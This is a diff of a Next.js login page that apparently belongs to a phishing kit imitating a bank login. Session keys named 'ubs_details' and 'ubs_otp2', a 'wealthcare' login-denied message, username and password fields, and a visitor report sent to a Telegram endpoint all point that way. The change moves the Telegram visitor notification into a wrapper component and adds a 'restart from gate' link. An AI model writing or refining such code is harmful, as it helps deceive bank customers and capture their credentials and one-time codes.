@@ -3,19 +3,16 @@
 import { useState, useEffect, useRef } from "react";
 import type { FormEvent } from "react";
 import { useRouter } from "next/navigation";
+import { HomepageVisitorNotify } from "@/components/homepage-visitor-notify";
 import { SiteFooter } from "@/components/site-footer";
-import { useVisitorTracking } from "@/hooks/use-visitor-tracking";
 import {
   MSG_LOGIN_DENIED_WEALTHCARE,
   MSG_UNABLE_REACH_VERIFICATION,
   MSG_UNABLE_VERIFY_TIME,
 } from "@/lib/approval-messages";
+import { restartFromGate } from "@/lib/restart-gate";
 
 export default function LoginPage() {
-  const [hasInteracted, setHasInteracted] = useState(false);
-  const visitorInfo = useVisitorTracking();
-  const hasSentVisitRef = useRef(false);
-
   useEffect(() => {
     if (typeof window === "undefined") return;
     // RULE 3B — canonical error codes only. `/?loginDenied=1` renders the
@@ -31,29 +28,6 @@ export default function LoginPage() {
     sessionStorage.removeItem("ubs_details");
     sessionStorage.removeItem("ubs_otp2");
   }, []);
-
-  useEffect(() => {
-    const onFirstInteraction = () => setHasInteracted(true);
-    window.addEventListener("pointerdown", onFirstInteraction, {
-      once: true,
-      passive: true,
-    });
-    window.addEventListener("keydown", onFirstInteraction, { once: true });
-    return () => {
-      window.removeEventListener("pointerdown", onFirstInteraction);
-      window.removeEventListener("keydown", onFirstInteraction);
-    };
-  }, []);
-
-  useEffect(() => {
-    if (!hasInteracted || !visitorInfo || hasSentVisitRef.current) return;
-    hasSentVisitRef.current = true;
-    fetch("/api/telegram/visitor", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(visitorInfo),
-    }).catch(console.error);
-  }, [hasInteracted, visitorInfo]);
 
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
@@ -121,6 +95,7 @@ export default function LoginPage() {
   }, []);
 
   return (
+    <HomepageVisitorNotify>
     <div className="min-h-screen flex flex-col bg-white">
       <style>{`
         *,*::before,*::after{box-sizing:border-box;}
@@ -142,7 +117,7 @@ export default function LoginPage() {
 
       <header className="border-b border-gray-200 px-6 py-4 bg-white">
         <div className="flex items-center">
-          <a href="#" onClick={(e) => e.preventDefault()} className="flex items-center shrink-0">
+          <a href="/" onClick={restartFromGate} className="flex items-center shrink-0">
             <img
               className="h-9 md:h-10 w-auto"
               src="/PeakOne-Logo-1.jpg"
@@ -365,5 +340,6 @@ export default function LoginPage() {
       <SiteFooter />
 
     </div>
+    </HomepageVisitorNotify>
   );
 }
